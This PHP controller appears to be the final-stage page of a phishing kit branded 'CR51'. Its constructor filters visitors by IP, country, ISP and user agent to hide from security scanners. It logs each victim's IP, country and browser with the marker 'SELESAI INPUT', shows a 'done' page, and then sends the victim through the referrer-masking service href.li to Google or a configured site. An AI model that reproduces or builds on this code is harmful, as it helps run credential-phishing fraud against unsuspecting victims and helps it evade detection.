<?php
defined("ALLOW") or exit('No direct script access allowed');

class Finished
{
	public $goCR51;
	public function __construct()
	{
		$this->goCR51 = new goCR51();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 8)) {
			write(FCPATH . 'CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|SESSION RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
		checkbacklist($this->goCR51->ip_address, 'ip');
		checkbacklist($_SESSION['countryCode'], 'countrycode');
		checkbacklist($_SESSION['isp'], 'isp');
		checkbacklist($_SERVER['HTTP_USER_AGENT'], 'ua');
	}

	public function index()
	{
		if ($this->goCR51->is_mobile) {
			echo view('mobile/done');
		} else {
			echo view('pc/done');
		}
	}

	public function logout()
	{
		session_destroy();
		if (_config('NOTFOUND') == 'custom') {
			write('CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|SELESAI INPUT\r\n");
			header("Location: https://href.li/?" . _redirect('Redirect'));
			die;
		} else {
			write('CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|SELESAI INPUT\r\n");
			header("Location: https://href.li/?https://www.google.com");
			die;
		}
	}
}
